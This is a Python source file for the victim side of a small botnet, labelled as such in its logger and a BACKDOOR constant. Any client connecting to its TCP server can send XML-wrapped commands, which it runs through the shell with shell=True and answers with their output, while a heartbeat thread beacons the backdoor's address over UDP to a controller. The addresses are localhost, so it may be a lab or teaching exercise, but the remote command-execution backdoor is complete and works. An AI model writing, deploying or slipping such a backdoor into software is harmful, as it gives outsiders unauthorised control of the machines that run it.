from datetime import datetime, timezone
from io import StringIO
import json
import logging
from socket import SOCK_DGRAM, AF_INET, socket
from socketserver import BaseRequestHandler, TCPServer
import subprocess
import xml.etree.ElementTree
from threading import Timer
from xml.etree.ElementTree import parse as xml
from dataclasses import dataclass


logging.basicConfig(level='DEBUG', datefmt='"%Y-%m-%d" "%H:%M:%S"', style='{',
                    format='{asctime}, "{levelname}", "{message}"')
log = logging.getLogger('botnet.victim.server')


class Executor(BaseRequestHandler):
    def handle(self):
        log.debug('Receiving data')
        request = self.request.recv(1024).strip().decode()
        log.debug(f'Handling request "{request}"')
        response = self.handle_request(request)
        log.debug('Sending response')
        self.request.sendall(response.encode())

    def handle_request(self, request):
        log.debug('Parse XML file for commands to execute')
        root = xml(StringIO(request)).getroot()
        result = []
        log.debug('Execute commands from file')
        for command in root.findall('./command'):
            cmd = command.text.split()
            timeout = float(command.get('timeout', 1))
            stdout = self.execute(cmd, timeout)
            dt = datetime.now(tz=timezone.utc)
            result.append({'datetime': dt, 'command': cmd, 'timeout': timeout, 'stdout': stdout})
        return json.dumps(result)

    def execute(self, command, timeout):
        log.debug('Executing command: %s with timeout: %s', command, timeout)
        with subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) as proc:
            try:
                result, errors = proc.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                log.error('Timeout %s exceeded for command: %s' % (timeout, command))
                return proc.kill()
            if errors:
                log.error(errors.decode())
            if result:
                # red = '\033[00;31m'
                # green = '\033[00;32m'
                # blue = '\033[00;36m'
                # white = '\033[00;39m'
                message = result.decode()
                log.debug('Output: {message}'.format(**locals()))
                return message


@dataclass
class Heartbeat:
    payload: tuple[str, int]
    frequency: float = 1.0
    destination: tuple[str, int] = ('127.0.0.1', 31337)
    family: int = AF_INET
    protocol: int = SOCK_DGRAM

    def run(self):
        Timer(self.frequency, self.send).start()

    def send(self):
        data = json.dumps(self.payload).encode()
        log.debug(f'Sending heartbeat: destination: {self.destination}; payload: {data}')
        with socket(self.family, self.protocol) as sock:
            sock.sendto(data, self.destination)
        self.run()


if __name__ == '__main__':
    BACKDOOR = ('localhost', 1337)

    log.info('Start Heartbeat')
    Heartbeat(frequency=1.0, payload=BACKDOOR).run()

    log.info('Start Executor')
    TCPServer(BACKDOOR, Executor).serve_forever()
